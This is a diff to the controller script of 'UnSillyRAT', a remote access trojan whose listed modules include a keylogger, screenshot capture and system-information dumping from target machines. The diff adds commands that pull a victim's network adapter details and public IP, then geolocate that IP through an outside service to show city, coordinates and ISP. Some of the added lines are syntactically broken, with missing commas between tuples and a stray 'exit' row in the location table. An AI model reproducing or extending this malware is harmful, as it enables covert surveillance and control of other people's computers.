@@ -1,17 +1,19 @@
-import sys
-import os
-import socket
-import time
-import base64
-import tabulate
-import signal
-import subprocess
 import argparse
-import shutil
-import threading
+import base64
+import os
 import platform
-import PyInstaller.__main__
+import shutil
+import signal
+import socket
+import subprocess
+import sys
+import threading
+import time
 from datetime import datetime
+
+import PyInstaller.__main__
+import requests
+import tabulate
 
 __LOGO__ = """
  _   _       ____  _ _ _       ____      _  _____ 
@@ -29,6 +31,7 @@ These are the commands available for usage:
 
     bind        Run the Server on machine and establish connections
     generate    Generate the Payload file for target platform
+    info        Show information about UnSillyRAT
 
 You can further get help on available commands by supplying
 '--help' argument. For example: 'python3 unsillyrat generate --help'
@@ -62,6 +65,10 @@ usage: python3 unsillyrat.py generate [--address ADDRESS] [--port PORT] [--outpu
 The generate command generates the required payload
 file to be executed on client side. The establish
 connection to server and do commands.
+"""
+
+__HELP__INFO___ = """
+
 """
 
 
@@ -147,6 +154,8 @@ class PULL:
             ('keylogger', 'KeyLogger Module'),
             ('sysinfo', 'Dump System, Processor, CPU and Network Information'),
             ('screenshot', 'Take Screenshot on Target Machine and Save on Local'),
+            ('networkinfo', 'Show Network Adapter and IP Info'),
+            ('publicip', 'Get the Public IP info of the client')
             ('exit', 'Exit from UnSillyRAT!')
         ]
         sys.stdout.write("\n")
@@ -248,6 +257,22 @@ class PULL:
         print("$ screenshot")
         sys.stdout.write("\n")
 
+    def help_c_networkinfo(self):
+        sys.stdout.write("\n")
+        print("Info       : Get the Local Network Adapter IP Info")
+        print("Arguments  : None")
+        print("Example    : \n")
+        print("$ networkinfo")
+        sys.stdout.write("\n")
+
+    def help_c_publicip(self):
+        sys.stdout.write("\n")
+        print("Info       : Get the target's Public IP")
+        print("Arguments  : None")
+        print("Example    : \n")
+        print("$ publicip")
+        sys.stdout.write("\n")
+
     def help_overall(self):
         global __HELP_OVERALL__
         print(__HELP_OVERALL__)
@@ -261,6 +286,11 @@ class PULL:
     def help_generate(self):
         global __HELP_GENERATE__
         print(__HELP_GENERATE__)
+        sys.exit(0)
+
+    def help_info(self):
+        global __HELP__INFO___
+        print(__HELP__INFO___)
         sys.exit(0)
 
 
@@ -344,6 +374,10 @@ class COMMCENTER:
                 pull.help_c_sysinfo()
             elif vals[1] == "screenshot":
                 pull.help_c_screenshot()
+            elif vals[1] == "publicip":
+                pull.help_c_publicip()
+            elif vals[1] == "networkinfo":
+                pull.help_c_networkinfo()
         else:
             if self.CURRENT:
                 pull.help_c_current()
@@ -467,6 +501,48 @@ class COMMCENTER:
             result = self.CURRENT[1].recv_data()
             if result.strip(" "):
                 print(result)
+        else:
+            pull.error("You need to connect before execute this command!")
+
+    def c_networkinfo(self):
+        if self.CURRENT:
+            self.CURRENT[1].send_data("networkinfo:")
+            result = self.CURRENT[1].recv_data()
+            if result.strip(" "):
+                print(result)
+        else:
+            pull.error("You need to connect before execute this command!")
+
+    def c_publicip(self):
+        if self.CURRENT:
+            self.CURRENT[1].send_data("publicip:")
+            result = self.CURRENT[1].recv_data()
+            if result.strip(" "):
+                ipinfor = requests.get(
+                    "http://ip-api.com/json/" + str(result).strip()).json()
+
+                headers = (pull.BOLD + 'Information' + pull.END,
+                           pull.BOLD + 'Value' + pull.END)
+                lister = [
+                    ('IP', str(result).strip())
+                    ('Country', str(ipinfor["country"])),
+                    ('Country Code', str(ipinfor["countryCode"])),
+                    ('Region', str(ipinfor["region"])),
+                    ('Region Name', str(ipinfor["regionName"])),
+                    ('City', str(ipinfor["city"])),
+                    ('Zip Code', str(ipinfor["zip"])),
+                    ('Latitude', str(ipinfor["lat"])),
+                    ('Longitude', str(ipinfor["lon"])),
+                    ('Timezone', str(ipinfor["timezone"])),
+                    ('ISP', str(ipinfor["isp"])),
+                    ('Org', str(ipinfor["org"])),
+                    ('AS', str(ipinfor["as"])),
+                    ('exit', 'Exit from UnSillyRAT!')
+                ]
+                sys.stdout.write("\n")
+                print(tabulate.tabulate(lister, headers=headers))
+                sys.stdout.write("\n")
+
         else:
             pull.error("You need to connect before execute this command!")
 
@@ -772,8 +848,10 @@ class PARSER:
                     pull.help_bind()
                 elif self.mode == "generate":
                     pull.help_generate()
+                elif self.mode == "info":
+                    pull.help_info()
                 else:
-                    pull.help_help()
+                    pull.help_overall()
 
     def v_address(self, str):
         return str
@@ -846,6 +924,8 @@ def main():
             generator.compile()
             generator.clean()
         pull.function("Done")
+    elif parser.mode == "info":
+        print(__HELP__INFO___)
 
 
 if __name__ == "__main__":
